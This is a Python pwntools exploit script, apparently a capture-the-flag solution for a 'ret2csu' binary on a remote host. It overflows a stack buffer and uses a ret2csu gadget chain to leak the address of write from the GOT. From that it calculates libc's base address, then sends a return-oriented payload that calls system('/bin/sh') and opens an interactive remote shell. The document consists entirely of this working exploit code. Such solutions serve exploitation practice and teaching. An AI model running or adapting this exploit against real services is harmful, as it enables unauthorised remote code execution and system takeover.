from pwn import *
context(arch='amd64',os='linux',log_level='debug')
sh=remote('58.240.236.232',13004)
elf = ELF("./ret2csu")
libc=ELF('./libc.so.6')
write_got = elf.got['write']
rdi_ret = 0x4006b3
vul = 0x4005E6
csu_start = 0x4006AA
csu_end = 0x400690
def ret2csu(rbx,rbp,r12,r13,r14,r15):
	payload = 'a'*(128+8)+p64(csu_start)
	payload += p64(rbx)+p64(rbp)+p64(r12)+p64(r13)
	payload += p64(r14)+p64(r15)+p64(csu_end)
	payload += 'a'*0x38+p64(vul)
	sh.sendline(payload)
	
sh.recvuntil("Input:\n")
ret2csu(0,1,write_got,8,write_got,1)
test = sh.recv(8)
#test=sh.recvline()
write=u64(test[:-1].ljust(8,'\x00'))
libc_base = write - libc.symbols['write']
system = libc_base + libc.symbols['system']
str_bin_sh = libc_base + next(libc.search("/bin/sh"))
payload = 'a'*(128+8)+p64(rdi_ret)+p64(str_bin_sh)+p64(system)
sh.sendline(payload)
sh.interactive()
